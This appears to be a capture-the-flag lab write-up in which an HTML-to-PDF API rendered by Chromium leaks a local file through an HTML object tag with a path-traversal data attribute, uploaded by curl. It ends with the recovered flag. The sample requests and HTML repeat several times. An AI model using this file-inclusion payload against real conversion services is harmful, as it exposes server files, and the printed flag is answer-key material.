# API Security

## Task
API security is becoming more and more a target for hackers. Please hack the api service and disclose the flag /tmp/secret/flag.txt

Please start the docker from RESOURCES. Example API requests:
```
curl --request POST \
    --url 'https://<server>/convert/markdown' \
    --header 'Content-Type: multipart/form-data' \
    --form files=@index.html \
    -o markdown.pdf

curl --request POST \
    --url https://<server>/convert/url \
    --header 'Content-Type: multipart/form-data' \
    --form remoteURL=https://localhost:3000 \
    --form marginTop=0 \
    --form marginBottom=0 \
    --form marginLeft=0 \
    --form marginRight=0 \
    -o url.pdf

curl --request POST \
    --url https://<server>/convert/html \
    --header 'Content-Type: multipart/form-data' \
    --form files=@index.html \
    --form resultFilename='foo.pdf' \
    -o html.pdf

curl --request POST \
    --url 'https://<server>/convert/markdown' \
    --header 'Content-Type: multipart/form-data' \
    --form files=@index.html \
    -o markdown.pdf
curl --request POST \
    --url 'https://<server>/convert/markdown' \
    --header 'Content-Type: multipart/form-data' \
    --form files=@index.html \
    -o markdown.pdf

curl --request POST \
    --url https://<server>/convert/url \
    --header 'Content-Type: multipart/form-data' \
    --form remoteURL=https://localhost:3000 \
    --form marginTop=0 \
    --form marginBottom=0 \
    --form marginLeft=0 \
    --form marginRight=0 \
    -o url.pdf

curl --request POST \
    --url https://<server>/convert/html \
    --header 'Content-Type: multipart/form-data' \
    --form files=@index.html \
    --form resultFilename='foo.pdf' \
    -o html.pdf

curl --request POST \
    --url 'https://<server>/convert/markdown' \
    --header 'Content-Type: multipart/form-data' \
    --form files=@index.html \
    -o markdown.pdf

```
Example index.html to convert

```
<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title>Test Page</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link rel='stylesheet' type='text/css' media='screen' href='main.css'>
    <script src='main.js'></script>
</head>
<body>
    <h1>API Security</h1>
    Hack me if you can. Disclose the file <code>/tmp/secret/flag.txt</code>

</body>
</html>
<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title>Test Page</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link rel='stylesheet' type='text/css' media='screen' href='main.css'>
    <script src='main.js'></script>
</head>
<body>
    <h1>API Security</h1>
    Hack me if you can. Disclose the file <code>/tmp/secret/flag.txt</code>

</body>
</html>
```

Goal: Exploit the api service. Disclose the following file from the api service: /tmp/secret/flag.txt and you will find the flag.


## Solution

The API seems to render a given HTML file to a PDF. In the "creator" and "producer" attributes of a generated PDF its shown, that a Chromium Browser is used to render the html. This can be used, since we can include also local files, if the Chromium Renderer does not prevent this properly. I tried different techniques, a simple object inclusion does the trick a the end:

index.html file:
```
<object data="../../../../../../../../../../tmp/secret/flag.txt" type="text/plain"
width="500" style="height: 300px">
```

API Command:
```
curl -v --request POST \
    --url "https://36c02be8-c9d1-4040-add7-24c8bc413a7d.idocker.vuln.land/convert/html" \
    --header 'Content-Type: multipart/form-data' \
    --form files=@index.html \
    -o markdown.pdf
```

The rendered "markdown.pdf" contained the flag: GOLDNUGGET=1d146b90-ce14-4eb6-8e0b-e0da120463ef
